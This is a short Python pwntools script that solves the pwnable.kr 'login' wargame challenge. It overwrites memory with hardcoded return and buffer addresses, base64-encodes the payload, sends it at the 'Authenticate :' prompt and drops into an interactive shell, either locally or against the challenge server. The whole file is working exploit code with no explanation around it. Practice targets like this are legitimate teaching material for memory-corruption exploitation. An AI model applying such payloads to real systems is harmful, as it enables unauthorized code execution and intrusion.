from pwn import *
import base64
local  = 1

if local == 0:
    target = remote('pwnable.kr',9003)

else:
    target = process('./login')
#target.interactive()
addr_sys = 0x08049284
addr_input = 0x0811EB40
payload = 'a' * 4 + p32(addr_sys) + p32(addr_input)
payload = base64.b64encode(payload)
#print payload
target.recvuntil('Authenticate :')
target.sendline(payload)
target.interactive()
